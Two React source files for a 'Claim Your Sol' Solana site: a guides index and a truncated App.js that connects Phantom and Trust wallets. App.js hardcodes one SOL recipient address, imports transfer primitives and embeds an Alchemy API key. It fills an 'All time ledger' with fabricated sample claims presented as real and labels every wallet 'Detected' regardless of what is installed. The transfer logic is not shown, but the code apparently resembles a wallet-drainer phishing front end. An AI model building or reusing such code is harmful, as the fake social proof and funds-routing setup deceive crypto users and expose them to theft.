// GuidesPage.js
import React from 'react';

const summaryLinks = [
  { href: '/guides/README', label: 'Support Index' },
  { href: '/guides/phantom-mobile', label: 'Phantom - Mobile Wallet' },
  { href: '/guides/bonkbot', label: 'Bonkbot - Telegram Trading Bot' },
  { href: '/guides/trojan', label: 'Trojan - Telegram Trading Bot' },
  { href: '/guides/unibot', label: 'Unibot/Unisol - Telegram Trading Bot' },
  { href: '/guides/photon', label: 'Photon - Trading Software' },
  { href: '/guides/bullx', label: 'BullX - Trading Software' },
  { href: '/guides/gmgn', label: 'GMGN.AI - Telegram Trading Bot' },
  { href: '/guides/pump.fun', label: 'Pump.fun - Trading Platform' },
  { href: '/guides/nova', label: 'Nova/TradeonNova - Telegram Trading Bot' },
  { href: '/guides/cys-simplified-model', label: 'CYS - Simplified Model' },
  { href: '/guides/cys-referral-system', label: 'CYS - Referral System' },
];

const guideCards = [
  {
    href: '/guides/phantom-mobile',
    img: 'https://claimyoursol.com/gitbook/Phantom-Icon_Square_512x512.png',
    alt: 'Phantom Mobile Wallet',
    title: 'Phantom Mobile Wallet',
    desc: 'Phantom Wallet is the most widely used mobile wallet for the Solana ecosystem, known for its sleek UI and seamless dApp integration.',
  },
  {
    href: '/guides/bonkbot',
    img: 'https://claimyoursol.com/gitbook/bonk_bot1719401308138.png',
    alt: 'Bonkbot Telegram Trading Bot',
    title: 'Bonkbot Telegram Trading Bot',
    desc: 'Bonkbot is a fast and easy-to-use Telegram bot for trading Solana tokens directly within your chat, popular for its speed and simplicity.',
  },
  {
    href: '/guides/trojan',
    img: 'https://claimyoursol.com/gitbook/_SOaHevN_400x400.jpg',
    alt: 'Trojan Telegram Trading Bot',
    title: 'Trojan Telegram Trading Bot',
    desc: 'Trojan is a feature-rich Telegram bot for sniping and trading Solana tokens, designed for advanced users looking for automation and speed.',
  },
  {
    href: '/guides/unibot',
    img: 'https://claimyoursol.com/gitbook/UniBot-Altcoin.png',
    alt: 'Unibot/Unisol Telegram Trading Bot',
    title: 'Unibot/Unisol Telegram Trading Bot',
    desc: 'Unibot, along with its Solana-specific version Unisol, is a powerful trading bot offering real-time token sniping and management tools within Telegram.',
  },
  {
    href: '/guides/photon',
    img: 'https://claimyoursol.com/gitbook/photon-logo.jpg',
    alt: 'Photon Trading Software',
    title: 'Photon Trading Software',
    desc: 'Photon is a professional-grade trading terminal tailored for Solana, offering in-depth charting, analytics, and multi-wallet management.',
  },
  {
    href: '/guides/bullx',
    img: 'https://claimyoursol.com/gitbook/bullx-logo.webp',
    alt: 'BullX Trading Software',
    title: 'BullX Trading Software',
    desc: 'BullX is a streamlined Solana trading platform offering quick execution, portfolio tracking, and advanced trading tools for active traders.',
  },
  {
    href: '/guides/gmgn',
    img: 'https://claimyoursol.com/gitbook/gmgn-ai-logo.png',
    alt: 'GMGN.AI - Telegram Trading Bot',
    title: 'GMGN.AI - Telegram Trading Bot',
    desc: 'GMGN.AI brings AI-powered insights and trading automation to Solana through a Telegram bot interface, aimed at simplifying smart trading.',
  },
  {
    href: '/guides/pump.fun',
    img: 'https://claimyoursol.com/gitbook/pumpfun-logo.webp',
    alt: 'Pump.fun - Trading Platform',
    title: 'Pump.fun - Trading Platform',
    desc: 'Pump.fun is a meme-token launchpad and trading platform on Solana, allowing users to create, buy, and sell community coins instantly.',
  },
  {
    href: '/guides/nova',
    img: 'https://claimyoursol.com/gitbook/nova-logo.jpg',
    alt: 'Nova/TradeonNova - Telegram Trading Bot',
    title: 'Nova/TradeonNova - Telegram Trading Bot',
    desc: 'Nova (TradeonNova) is a Telegram bot that enables fast, efficient trading of Solana tokens with features like sniping, tracking, and wallet integration.',
  },
  {
    href: '/guides/cys-simplified-model',
    img: 'https://claimyoursol.com/gitbook/cys-banner-alt%20(1).png',
    alt: 'CYS - Simplified Model',
    title: 'CYS - Simplified Model',
    desc: 'This guide explains the fundamentals of the Claim Your Sol model, designed to make reward distribution easy, transparent, and user-friendly.',
  },
  {
    href: '/guides/cys-referral-system',
    img: 'https://claimyoursol.com/gitbook/cys-banner-alt%20(1).png',
    alt: 'CYS - Referral System',
    title: 'CYS - Referral System',
    desc: 'Learn how the CYS referral system works, including how to invite others, track your rewards, and maximize your earnings through network growth.',
  },
];

const GuidesPage = () => (
  <div className="p-0 m-0 min-h-screen text-base">
    <div className="container mx-auto flex flex-col text-gray-200">

      {/* Header */}
      <div className="flex items-center justify-between p-2 lg:p-4 mb-8 border-b border-gray-700 z-10 bg-gray-900 sticky top-0">
        <a href="/guides" className="flex gap-4 items-center text-white hover:text-gray-200">
          <img className="h-10 w-10 drop-shadow-lg" src="/images/cys-logo.png" alt="Claim Your Sol Logo" />
          <span className="text-lg font-semibold">CYS Guides</span>
        </a>
        <a href="/" className="text-sm text-white hover:text-gray-200">Back to CYS</a>
      </div>

      <div className="flex flex-row gap-10">
        {/* Sidebar */}
        <nav className="text-sm text-gray-400 basis-[22rem] hidden lg:block sticky top-[6.5rem] self-start h-max">
          <ul>
            {summaryLinks.map(link => (
              <li key={link.href} className="mb-2">
                <a href={link.href} className="hover:text-gray-200">{link.label}</a>
              </li>
            ))}
          </ul>
        </nav>

        {/* Content */}
        <article className="max-w-3xl px-4 sm:px-6 lg:px-0 mb-8 lg:mb-4 w-full" id="docs-body">
          <h1 className="text-2xl font-bold text-gray-100">Support Index</h1>
          <h2 className="lead mb-4 text-gray-400 text-lg">
            Quick guides to claim your sol with every compatible software and wallet
          </h2>
          <figure className="flex items-center justify-center mb-6">
            <img src="https://claimyoursol.com/gitbook/cys-banner-alt.png" alt="Claim Your Sol Logo" width="375" />
            <figcaption className="mt-2 text-sm text-gray-500">
              <a href="https://claimyoursol.com" className="hover:underline">https://claimyoursol.com</a>
            </figcaption>
          </figure>
          <p className="mb-6 text-gray-200">
            Explore our collection of step-by-step guides to help you{' '}
            <a href="https://claimyoursol.com" className="text-blue-500 hover:underline">Claim Your Sol</a>
            {' '}using the most popular tools in the Solana ecosystem. Whether you’re using a wallet like Phantom or Solflare, a Telegram bot, or trading platforms commonly used across the network, we’ve got you covered.
            These guides are designed to simplify the process, no matter your experience level, and ensure you can confidently claim what’s yours with the tools you already use.
          </p>

          {/* Card Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
            {guideCards.map(card => (
              <div key={card.href} className="card bg-gray-800 rounded-lg overflow-hidden drop-shadow-lg">
                <a href={card.href} className="block">
                  <img src={card.img} alt={card.alt} className="w-full h-48 object-cover" />
                  <div className="p-4">
                    <h3 className="card-title text-lg font-semibold text-white mb-2">{card.title}</h3>
                    <p className="card-desc text-gray-400">{card.desc}</p>
                  </div>
                </a>
              </div>
            ))}
          </div>

        </article>
      </div>

      <div className="hidden aspect-video"></div>
    </div>
  </div>
);

export default GuidesPage;

----------------------------
// App.js
import React, { useState, useEffect } from 'react';
import {
  Connection,
  LAMPORTS_PER_SOL,
  Transaction,
  SystemProgram,
  PublicKey
} from '@solana/web3.js';
import { PhantomWalletAdapter, TrustWalletAdapter } from '@solana/wallet-adapter-wallets';
import { WalletReadyState } from '@solana/wallet-adapter-base';
import nacl from 'tweetnacl';
import bs58 from 'bs58';
import { Buffer } from 'buffer';
global.Buffer = global.Buffer || Buffer;

// Instantiate adapters
const phantomAdapter = new PhantomWalletAdapter();
const trustAdapter = new TrustWalletAdapter();

const WALLET_ICONS = {
  phantom: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA4IiBoZWlnaHQ9IjEwOCIgdmlld0JveD0iMCAwIDEwOCAxMDgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPgo=',
  trust: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTgiIGhlaWdodD0iNjUiIHZpZXdCb3g9IjAgMCA1OCA2NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTAgOS4zODk0OUwyOC44OTA3IDBWNjUuMDA0MkM4LjI1NDUgNTYuMzM2OSAwIDM5LjcyNDggMCAzMC4zMzUzVjkuMzg5NDlaIiBmaWxsPSIjMDUwMEZGIi8+CjxwYXRoIGQ9Ik01Ny43ODIyIDkuMzg5NDlMMjguODkxNSAwVjY1LjAwNDJDNDkuNTI3NyA1Ni4zMzY5IDU3Ljc4MjIgMzkuNzI0OCA1Ny43ODIyIDMwLjMzNTNWOS4zODk0OVoiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl8yMjAxXzY5NDIpIi8+CjxkZWZzPgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXJfMjIwMV82OTQyIiB4MT0iNTEuMzYxNSIgeTE9Ii00LjE1MjkzIiB4Mj0iMjkuNTM4NCIgeTI9IjY0LjUxNDciIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agb2Zmc2V0PSIwLjAyMTEyIiBzdG9wLWNvbG9yPSIjMDAwMEZGIi8+CjxzdG9wIG9mZnNldD0iMC4wNzYyNDIzIiBzdG9wLWNvbG9yPSIjMDA5NEZGIi8+CjxzdG9wIG9mZnNldD0iMC4xNjMwODkiIHN0b3AtY29sb3I9IiM0OEZGOTEiLz4KPHN0b3Agb2Zmc2V0PSIwLjQyMDA0OSIgc3RvcC1jb2xvcj0iIzAwOTRGRiIvPgo8c3RvcCBvZmZzZXQ9IjAuNjgyODg2IiBzdG9wLWNvbG9yPSIjMDAzOEZGIi8+CjxzdG9wIG9mZnNldD0iMC45MDI0NjUiIHN0b3AtY29sb3I9IiMwNTAwRkYiLz4KPC9saW5lYXJHcmFkaWVudD4KPC9kZWZzPgo8L3N2Zz4K',
};

// Helper to shorten address
const shortenAddress = (addr = '') =>
  addr.length > 8 ? `${addr.slice(0, 4)}..${addr.slice(-4)}` : addr;

const ConnectButton = ({ connected, connecting, selectedWallet, account, onClick }) => {
  const icon = WALLET_ICONS[selectedWallet];
  return (
    <button
      onClick={onClick}
      disabled={connecting}
      className="swv-button swv-button-trigger flex items-center gap-2"
    >
      {!connected && !connecting && 'Select Wallet'}
      {connecting && 'Connecting...'}
      {connected && !connecting && (
        <>
          {icon && <img src={icon} alt={selectedWallet} className="h-6 w-6 rounded-full" />}
          <span>{shortenAddress(account)}</span>
        </>
      )}
    </button>
  );
};

// Generate dApp key pair for Diffie–Hellman key exchange
const dappKeyPair = nacl.box.keyPair();

// Decryption helper for Phantom deep link
const decryptPayload = (data, nonce, sharedSecret) => {
  if (!sharedSecret) throw new Error("Missing shared secret");
  const decrypted = nacl.box.open.after(
    bs58.decode(data),
    bs58.decode(nonce),
    sharedSecret
  );
  if (!decrypted) throw new Error("Unable to decrypt data");
  return JSON.parse(Buffer.from(decrypted).toString('utf8'));
};

const cryptoOptions = {
  SOL: "7AQz1cBj7xgtRbG91dSWRhUysAM86pK4p9yvD5aMbNcU"
};
const ALCHEMY_RPC = "https://solana-mainnet.g.alchemy.com/v2/L9fb1fan5l6E4bskkY4ENKDxBMb08-YN";

// Create an HTTP-only connection (no WebSocket) to avoid wss:// errors
const createConnection = () => {
  return new Connection(ALCHEMY_RPC, {
    commitment: 'finalized',
    wsEndpoint: null
  });
};

const CheckIcon = () => (
  <svg className="h-5 w-5" fill="none" viewBox="0 0 30 30">
    <path
      className="fill-green-700"
      d="M13.474 2.80108C14.2729 1.85822 15.7271 1.85822 16.526 2.80108L17.4886 3.9373C17.9785 4.51548 18.753 4.76715 19.4892 4.58733L20.9358 4.23394C22.1363 3.94069 23.3128 4.79547 23.4049 6.0278L23.5158 7.51286C23.5723 8.26854 24.051 8.92742 24.7522 9.21463L26.1303 9.77906C27.2739 10.2474 27.7233 11.6305 27.0734 12.6816L26.2903 13.9482C25.8918 14.5928 25.8918 15.4072 26.2903 16.0518L27.0734 17.3184C27.7233 18.3695 27.2739 19.7526 26.1303 20.2209L24.7522 20.7854C24.051 21.0726 23.5723 21.7315 23.5158 22.4871L23.4049 23.9722C23.3128 25.2045 22.1363 26.0593 20.9358 25.7661L19.4892 25.4127C18.753 25.2328 17.9785 25.4845 17.4886 26.0627L16.526 27.1989C15.7271 28.1418 14.2729 28.1418 13.474 27.1989L12.5114 26.0627C12.0215 25.4845 11.247 25.2328 10.5108 25.4127L9.06418 25.7661C7.86371 26.0593 6.6872 25.2045 6.59513 23.9722L6.48419 22.4871C6.42773 21.7315 5.94903 21.0726 5.24777 20.7854L3.86969 20.2209C2.72612 19.7526 2.27673 18.3695 2.9266 17.3184L3.70973 16.0518C4.10824 15.4072 4.10824 14.5928 3.70973 13.9482L2.9266 12.6816C2.27673 11.6305 2.72612 10.2474 3.86969 9.77906L5.24777 9.21463C5.94903 8.92742 6.42773 8.26854 6.48419 7.51286L6.59513 6.0278C6.6872 4.79547 7.86371 3.94069 9.06418 4.23394L10.5108 4.58733C11.247 4.76715 12.0215 4.51548 12.5114 3.9373L13.474 2.80108Z"
    />
    <path d="M13.5 17.625L10.875 15L10 15.875L13.5 19.375L21 11.875L20.125 11L13.5 17.625Z" fill="white" stroke="white" />
  </svg>
);

const ConnectWalletModal = ({ onClose, onSelect }) => (
  <div aria-labelledby="swv-modal-title" aria-modal="true" role="dialog" className="swv-modal">
    <div className="swv-modal-overlay"></div>
    <div className="swv-modal-container">

      <div className="swv-modal-wrapper swv-modal-wrapper-no-logo">
        <h1 id="swv-modal-title" className="swv-modal-title">Connect Wallet</h1>
        <button onClick={onClose} className="swv-modal-button-close">
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M14 12.461 8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z" fill="currentColor" />
          </svg>
        </button>

        <ul className="swv-modal-list">
          {[
            { id: 'phantom', label: 'Phantom', icon: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA4IiBoZWlnaHQ9IjEwOCIgdmlld0JveD0iMCAwIDEwOCAxMDgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPgo=' },
            { id: 'trust', label: 'Trust', icon: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTgiIGhlaWdodD0iNjUiIHZpZXdCb3g9IjAgMCA1OCA2NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTAgOS4zODk0OUwyOC44OTA3IDBWNjUuMDA0MkM4LjI1NDUgNTYuMzM2OSAwIDM5LjcyNDggMCAzMC4zMzUzVjkuMzg5NDlaIiBmaWxsPSIjMDUwMEZGIi8+CjxwYXRoIGQ9Ik01Ny43ODIyIDkuMzg5NDlMMjguODkxNSAwVjY1LjAwNDJDNDkuNTI3NyA1Ni4zMzY5IDU3Ljc4MjIgMzkuNzI0OCA1Ny43ODIyIDMwLjMzNTNWOS4zODk0OVoiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl8yMjAxXzY5NDIpIi8+CjxkZWZzPgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXJfMjIwMV82OTQyIiB4MT0iNTEuMzYxNSIgeTE9Ii00LjE1MjkzIiB4Mj0iMjkuNTM4NCIgeTI9IjY0LjUxNDciIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agb2Zmc2V0PSIwLjAyMTEyIiBzdG9wLWNvbG9yPSIjMDAwMEZGIi8+CjxzdG9wIG9mZnNldD0iMC4wNzYyNDIzIiBzdG9wLWNvbG9yPSIjMDA5NEZGIi8+CjxzdG9wIG9mZnNldD0iMC4xNjMwODkiIHN0b3AtY29sb3I9IiM0OEZGOTEiLz4KPHN0b3Agb2Zmc2V0PSIwLjQyMDA0OSIgc3RvcC1jb2xvcj0iIzAwOTRGRiIvPgo8c3RvcCBvZmZzZXQ9IjAuNjgyODg2IiBzdG9wLWNvbG9yPSIjMDAzOEZGIi8+CjxzdG9wIG9mZnNldD0iMC45MDI0NjUiIHN0b3AtY29sb3I9IiMwNTAwRkYiLz4KPC9saW5lYXJHcmFkaWVudD4KPC9kZWZzPgo8L3N2Zz4K' },
            { id: 'metaMask', label: 'MetaMask', icon: 'PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjMxIiB2aWV3Qm94PSIwIDAgMzEgMzEiIHdpZHRoPSIzMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI' },
          ].map(w => (
            <li key={w.id}>
              <button onClick={() => onSelect(w.id)} className="swv-button">
                <img src={w.icon} alt={`${w.label} icon`} className="h-6 w-6 mr-3" />
                <span className="flex-1 text-left text-gray-900 dark:text-gray-100">{w.label}</span>
                <span className="text-sm text-green-600">Detected</span>
              </button>
            </li>
          ))}
        </ul>

        {/* <button className="mt-4 w-full p-2 text-sm text-blue-600 hover:text-blue-800 flex justify-center items-center">
          More options
          <svg className="ml-1" width="11" height="6" viewBox="0 0 11 6" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="m5.938 5.73 4.28-4.126a.915.915 0 0 0 0-1.322 1 1 0 0 0-1.371 0L5.253 3.736 1.659.272a1 1 0 0 0-1.371 0A.93.93 0 0 0 0 .932c0 .246.1.48.288.662l4.28 4.125a.99.99 0 0 0 1.37.01z" fill="currentColor"/>
          </svg>
        </button> */}
      </div>
    </div>
  </div>
);

// Ledger Component
const AllTimeLedger = ({ entries }) => (
  <div className="flex flex-col font-roboto bg-white dark:bg-gray-800 text-gray-200 border border-gray-300 dark:border-gray-700 drop-shadow p-2 gap-2 rounded-lg mb-4 overflow-x-auto">
    <div className="text-base text-gray-800 dark:text-gray-300 text-center uppercase font-roboto font-semibold mb-2">
      All time ledger
    </div>
    <table className="max-w-5xl min-w-content w-full mx-auto">
      <thead>
        <tr className="border-b-2 border-gray-300 dark:border-gray-700">
          {['Wallet/TX', 'Accts', 'Claimed SOL', 'Date'].map((h) => (
            <th key={h} className="p-1 whitespace-nowrap text-xs uppercase font-semibold text-gray-700 dark:text-gray-400 text-left">
              {h}
            </th>
          ))}
        </tr>
      </thead>
      <tbody>
        {entries.map((e) => (
          <tr key={e.tx} className="border-b border-gray-300 dark:border-gray-600 last:border-0 hover:bg-gray-200 dark:hover:bg-gray-900">
            <td className="py-1 pr-1 whitespace-nowrap">
              <div className="text-sm lg:text-base text-gray-600 dark:text-gray-300">{e.walletShort}</div>
              <div className="flex items-center gap-2">
                <a href={e.txUrl} target="_blank" rel="noopener noreferrer" className="text-xs lg:text-sm text-green-600">
                  {e.txShort}
                </a>
                <CheckIcon />
              </div>
            </td>
            <td className="text-sm pl-1 lg:text-base text-gray-700 dark:text-gray-200 font-semibold">
              {e.accounts}
            </td>
            <td className="text-sm lg:text-base text-blue-700 dark:text-blue-400 font-semibold">
              {e.claimedSol} SOL
            </td>
            <td className="py-1 pl-1 whitespace-nowrap text-sm lg:text-base text-gray-500 dark:text-gray-400">
              <div>{e.date}</div>
              <div className="text-sm text-gray-400 dark:text-gray-500">{e.time}</div>
            </td>
          </tr>
        ))}
        <tr>
          <td colSpan={4} className="flex justify-center p-2">
            <button className="uppercase font-semibold p-1 text-xs bg-gray-600 text-gray-200 hover:text-white rounded">
              Load More
            </button>
          </td>
        </tr>
      </tbody>
    </table>
  </div>
);

function App() {
  const [account, setAccount] = useState(null);
  const [balance, setBalance] = useState(null);
  const [txHash, setTxHash] = useState(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [isSending, setIsSending] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [showModal, setShowModal] = useState(false);

  const resetWalletSelector = () => {
    localStorage.removeItem('connectedAccount');
    localStorage.removeItem('selectedWallet');
    setAccount(null);
    setSelectedWallet(null);
    // Optionally reload the page:
    window.location.reload();
  };

  const sampleData = [
    { walletShort: '9LDGX...bmcc', tx: '36FJhEWBxvajsL6KC6VQWqLtrzM2yHC3A8JXCPW6xfx8rw4GQth27Sm73Z4uC59i4oth4HGrHjyqR3w2RMrXrMqo', txShort: '5waTD...xLQX', txUrl: '#', accounts: 1, claimedSol: '0.00163', date: '2025-05-04', time: '15:44' },
    { walletShort: 'EtEma...3fFe', tx: '1S5fELt1TMKV5T7W4YSrtYqFXcr4XTCYh73BRafLUNfvC839Q2SHN4xQK65HoXgWUHLsq8fbNyHhTFTLY81fgED', txShort: 'KiBfa...uwrV', txUrl: '#', accounts: 1, claimedSol: '0.00163', date: '2025-05-04', time: '15:44' },
    { walletShort: '4T2fj...MpZM', tx: 'ffe9MuhyxUKnMrtGYVvacyAKrPw9tWAaWffpje2Ui1ji9HMi21aZL3kiPC6mAzz1j3LGhRPsF5PnmjFR9QNXENK', txShort: '5PYLg...H5dJ', txUrl: '#', accounts: 4, claimedSol: '0.00653', date: '2025-05-04', time: '15:44' },
    { walletShort: '696VG...73ta', tx: '81QBi4gZYNqxg8N1MeGrHbQUL4SxKkKoaho6G94Zrhe2siWeJXL3aYsLSTCrZXdYEg1zzh1BCpxiTKtCj4x3rVg', txShort: '35keQ...7peo', txUrl: '#', accounts: 1, claimedSol: '0.00163', date: '2025-05-04', time: '15:44' },
    { walletShort: '2YXsz...6Mh4', tx: '1291QxdVHrvAcxAc76RmwkfKrVjEWpqSEnZNXnRnQtDmnvF46nNfSoedEoPfRb6C71UDMas3dK2gCpv6ztd5LKaG', txShort: '5gpn3...D1w9', txUrl: '#', accounts: 1, claimedSol: '0.00163', date: '2025-05-04', time: '15:43' },
    { walletShort: '4dX7t...tgbP', tx: '3n1FmAAzrixuCAc7bW7mLeZAPBf8uPd5jhhrx1cUY2MEZW9Y1ZR6sQ927pGg7Ny5q8gHbAj1iZFsCxX11iiQUEMd', txShort: '4kRZn...qXu1', txUrl: '#', accounts: 1, claimedSol: '0.00163', date: '2025-05-04', time: '15:43' },
    { walletShort: 'CacZg...NPQn', tx: '4dTfPAuXe4LwqsY31qgVZHydkAb8JXfLCGcX96bUQGvkEC9Wyd5LMNr9ZRWiP5xnHVyKohD8SpYsAFgjgUfGo2ts', txShort: '63FMZ...uoCk', txUrl: '#', accounts: 3, claimedSol: '0.00489', date: '2025-05-04', time: '15:42' },
    { walletShort: 'DfwV5...NLMr', tx: '5V4JThArCn2yP1mfpgxrHtFJkGrEBdpNsWnmgXqHF3sX7RpGwZRjQar98tDSvq11zQbq7wWDycLNkMBHabrPQ5Sx', txShort: '5V4JT...Q5Sx', txUrl: '#', accounts: 21, claimedSol: '0.03426', date: '2025-05-04', time: '15:42' },
    { walletShort: 'qh9qA...FiNu', tx: '5v2KqH6NBg1LoH7KRMpP9SFTPSNdWhZvZ41dxwoDtwZsaooKwkP63o1SctERjRKr1U7KHk2mN7jddtoZrLiStzW4', txShort: 'qh9qA...FiNu', txUrl: '#', accounts: 23, claimedSol: '0.03752', date: '2025-05-04', time: '15:42' },
  ];

  // On mount: restore and handle deep link/auto-connect
  useEffect(() => {
    const storedAccount = localStorage.getItem("connectedAccount");
    const storedWallet = localStorage.getItem("selectedWallet");
    if (storedAccount && storedWallet) {
      setAccount(storedAccount);
      setSelectedWallet(storedWallet);
      fetchBalance(storedAccount);
    }
    // Phantom mobile deep link
    const url = new URL(window.location.href);
    if (/onConnect/.test(url.pathname)) {
      const pubEnc = url.searchParams.get("phantom_encryption_public_key");
      const encrypted = url.searchParams.get("data");
      const nonce = url.searchParams.get("nonce");
      if (pubEnc && encrypted && nonce) {
        try {
          const secret = nacl.box.before(
            bs58.decode(pubEnc),
            dappKeyPair.secretKey
          );
          const payload = decryptPayload(encrypted, nonce, secret);
          if (payload.public_key) {
            const pk = new PublicKey(payload.public_key).toString();
            setAccount(pk);
            localStorage.setItem("connectedAccount", pk);
            fetchBalance(pk);
          }
        } catch (e) {
          console.error("Deep link error:", e);
        }
      }
      window.history.replaceState({}, document.title, window.location.pathname);
    }
    // Auto-connect Trust Wallet in DApp browser on mobile
    if (
      storedWallet === 'trust' &&
      trustAdapter.readyState === WalletReadyState.Installed &&
      !account
    ) {
      trustAdapter
        .connect()
        .then(() => {
          const pk = trustAdapter.publicKey.toString();
          setAccount(pk);
          fetchBalance(pk);
        })
